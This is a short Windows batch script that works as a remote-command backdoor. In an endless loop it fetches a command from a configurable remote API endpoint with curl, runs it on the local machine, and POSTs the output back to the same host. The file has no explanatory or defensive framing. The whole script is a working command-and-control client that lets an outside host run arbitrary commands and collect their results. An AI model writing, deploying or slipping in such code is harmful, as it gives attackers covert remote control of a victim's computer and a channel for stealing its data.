@echo off

setlocal enabledelayedexpansion
set apilink=
:CHECK_CMD_CHANGE

curl -o %temp%\cmd.txt %apilink%/getcmd

set /p new_cmd=<%temp%\cmd.txt
del %temp%\cmd.txt
if "%new_cmd%"=="%cmd%" (
  timeout /t 2 /nobreak >nul
  goto CHECK_CMD_CHANGE
)

set "cmd=%new_cmd%"

%cmd% >%temp%\output.txt

set /p output=<%temp%\output.txt

curl -X POST -d "output=!output!" %apilink%/setoutput
del %temp%\output.txt
goto CHECK_CMD_CHANGE

endlocal
